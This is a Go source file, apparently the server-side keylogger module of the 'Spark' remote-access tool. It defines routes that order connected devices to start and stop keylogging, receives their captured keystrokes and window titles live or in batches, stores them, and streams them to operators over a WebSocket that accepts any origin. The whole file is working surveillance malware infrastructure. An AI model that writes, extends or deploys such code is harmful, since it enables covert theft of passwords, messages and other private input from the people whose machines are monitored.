package keylogger

import (
	"Spark/modules"
	"Spark/server/common"
	"Spark/utils"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

// KeyEvent represents a single keystroke event
type KeyEvent struct {
	Key       string    `json:"key"`
	Timestamp time.Time `json:"timestamp"`
	Window    string    `json:"window"`
	Type      string    `json:"type"`
	DeviceID  string    `json:"deviceId"`
}

// KeyloggerConfig holds configuration for the keylogger
type KeyloggerConfig struct {
	Mode            string `json:"mode"`            // "live", "offline", "both"
	OfflineInterval int    `json:"offlineInterval"` // seconds between offline uploads
	MaxBuffer       int    `json:"maxBuffer"`       // max events to buffer before forced upload
}

// KeyloggerSession represents an active keylogger session
type KeyloggerSession struct {
	DeviceID    string          `json:"deviceId"`
	Config      KeyloggerConfig `json:"config"`
	StartTime   time.Time       `json:"startTime"`
	IsActive    bool            `json:"isActive"`
	EventCount  int             `json:"eventCount"`
	LastEvent   time.Time       `json:"lastEvent"`
	LiveClients []*websocket.Conn `json:"-"`
}

var (
	// Store active keylogger sessions
	activeSessions = make(map[string]*KeyloggerSession)
	// Store keylogger events (in production, use a database)
	keyloggerEvents = make(map[string][]KeyEvent)
)

// InitRoutes initializes keylogger routes
func InitRoutes(routes *gin.RouterGroup) {
	keylogger := routes.Group("/keylogger")
	{
		keylogger.POST("/start/:device", startKeylogger)
		keylogger.POST("/stop/:device", stopKeylogger)
		keylogger.GET("/status/:device", getKeyloggerStatus)
		keylogger.GET("/events/:device", getKeyloggerEvents)
		keylogger.DELETE("/events/:device", clearKeyloggerEvents)
		keylogger.GET("/live/:device", liveKeylogger)
	}
}

// Start keylogger on a device
func startKeylogger(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	connUUID, ok := common.CheckDevice(deviceID, "")
	if !ok {
		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
		return
	}

	var config KeyloggerConfig
	if err := ctx.ShouldBindJSON(&config); err != nil {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "Invalid configuration"})
		return
	}

	// Set defaults
	if config.Mode == "" {
		config.Mode = "offline"
	}
	if config.OfflineInterval == 0 {
		config.OfflineInterval = 60
	}
	if config.MaxBuffer == 0 {
		config.MaxBuffer = 1000
	}

	packet := modules.Packet{
		Act:  "KEYLOGGER_START",
		Data: config,
	}

	common.SendPackByUUID(packet, connUUID)

	// Create session
	session := &KeyloggerSession{
		DeviceID:    deviceID,
		Config:      config,
		StartTime:   time.Now(),
		IsActive:    true,
		EventCount:  0,
		LiveClients: make([]*websocket.Conn, 0),
	}
	activeSessions[deviceID] = session

	ctx.JSON(http.StatusOK, gin.H{
		"message": "Keylogger started successfully",
		"session": session,
	})
}

// Stop keylogger on a device
func stopKeylogger(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	connUUID, ok := common.CheckDevice(deviceID, "")
	if !ok {
		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
		return
	}

	packet := modules.Packet{
		Act: "KEYLOGGER_STOP",
	}

	common.SendPackByUUID(packet, connUUID)

	// Update session
	if session, exists := activeSessions[deviceID]; exists {
		session.IsActive = false
	}

	ctx.JSON(http.StatusOK, gin.H{"message": "Keylogger stopped successfully"})
}

// Get keylogger status
func getKeyloggerStatus(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	connUUID, ok := common.CheckDevice(deviceID, "")
	if !ok {
		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
		return
	}

	packet := modules.Packet{
		Act: "KEYLOGGER_STATUS",
	}

	common.SendPackByUUID(packet, connUUID)

	// Return session info if available
	if session, exists := activeSessions[deviceID]; exists {
		ctx.JSON(http.StatusOK, gin.H{
			"session": session,
			"events":  len(keyloggerEvents[deviceID]),
		})
	} else {
		ctx.JSON(http.StatusOK, gin.H{
			"session": nil,
			"events":  len(keyloggerEvents[deviceID]),
		})
	}
}

// Get keylogger events
func getKeyloggerEvents(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	
	// Query parameters for filtering
	limitStr := ctx.DefaultQuery("limit", "100")
	offsetStr := ctx.DefaultQuery("offset", "0")
	fromStr := ctx.Query("from")
	toStr := ctx.Query("to")

	var limit, offset int
	fmt.Sscanf(limitStr, "%d", &limit)
	fmt.Sscanf(offsetStr, "%d", &offset)

	events := keyloggerEvents[deviceID]
	if events == nil {
		events = make([]KeyEvent, 0)
	}

	// Filter by time range if provided
	if fromStr != "" || toStr != "" {
		var filteredEvents []KeyEvent
		for _, event := range events {
			include := true
			
			if fromStr != "" {
				if fromTime, err := time.Parse(time.RFC3339, fromStr); err == nil {
					if event.Timestamp.Before(fromTime) {
						include = false
					}
				}
			}
			
			if toStr != "" {
				if toTime, err := time.Parse(time.RFC3339, toStr); err == nil {
					if event.Timestamp.After(toTime) {
						include = false
					}
				}
			}
			
			if include {
				filteredEvents = append(filteredEvents, event)
			}
		}
		events = filteredEvents
	}

	// Apply pagination
	total := len(events)
	start := offset
	end := offset + limit

	if start >= total {
		events = make([]KeyEvent, 0)
	} else {
		if end > total {
			end = total
		}
		events = events[start:end]
	}

	ctx.JSON(http.StatusOK, gin.H{
		"events": events,
		"total":  total,
		"limit":  limit,
		"offset": offset,
	})
}

// Clear keylogger events
func clearKeyloggerEvents(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	delete(keyloggerEvents, deviceID)
	
	ctx.JSON(http.StatusOK, gin.H{"message": "Events cleared successfully"})
}

// WebSocket for live keylogger events
func liveKeylogger(ctx *gin.Context) {
	deviceID := ctx.Param("device")
	
	upgrader := websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
	
	conn, err := upgrader.Upgrade(ctx.Writer, ctx.Request, nil)
			if err != nil {
			common.Error("keylogger", "websocket", "upgrade_failed", err.Error(), nil)
			return
		}
	defer conn.Close()

	// Add to live clients for this device
	if session, exists := activeSessions[deviceID]; exists {
		session.LiveClients = append(session.LiveClients, conn)
		
		// Remove from live clients when connection closes
		defer func() {
			for i, client := range session.LiveClients {
				if client == conn {
					session.LiveClients = append(session.LiveClients[:i], session.LiveClients[i+1:]...)
					break
				}
			}
		}()
	}

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

// HandleKeyloggerEvent processes incoming keylogger events from clients
func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
	switch eventType {
	case "keylogger_live":
		// Handle live keystroke event
		var event KeyEvent
		if err := json.Unmarshal(data, &event); err != nil {
			common.Error("keylogger", "unmarshal", "live_event_failed", err.Error(), nil)
			return
		}
		
		event.DeviceID = deviceID
		
		// Store the event
		if keyloggerEvents[deviceID] == nil {
			keyloggerEvents[deviceID] = make([]KeyEvent, 0)
		}
		keyloggerEvents[deviceID] = append(keyloggerEvents[deviceID], event)
		
		// Update session
		if session, exists := activeSessions[deviceID]; exists {
			session.EventCount++
			session.LastEvent = event.Timestamp
			
			// Send to live clients
			for _, client := range session.LiveClients {
				if err := client.WriteJSON(event); err != nil {
					common.Error("keylogger", "websocket", "send_failed", err.Error(), nil)
				}
			}
		}

	case "keylogger_upload":
		// Handle batch upload of events
		var events []KeyEvent
		if err := json.Unmarshal(data, &events); err != nil {
			common.Error("keylogger", "unmarshal", "batch_events_failed", err.Error(), nil)
			return
		}
		
		// Add device ID to events and store them
		if keyloggerEvents[deviceID] == nil {
			keyloggerEvents[deviceID] = make([]KeyEvent, 0)
		}
		
		for i := range events {
			events[i].DeviceID = deviceID
		}
		
		keyloggerEvents[deviceID] = append(keyloggerEvents[deviceID], events...)
		
		// Update session
		if session, exists := activeSessions[deviceID]; exists {
			session.EventCount += len(events)
			if len(events) > 0 {
				session.LastEvent = events[len(events)-1].Timestamp
			}
		}

	case "keylogger_started":
		common.Info("keylogger", "status", "started", deviceID, nil)

	case "keylogger_stopped":
		common.Info("keylogger", "status", "stopped", deviceID, nil)
		if session, exists := activeSessions[deviceID]; exists {
			session.IsActive = false
		}

	case "keylogger_error":
		common.Error("keylogger", "device", "error", string(data), map[string]any{"device": deviceID})
	}
}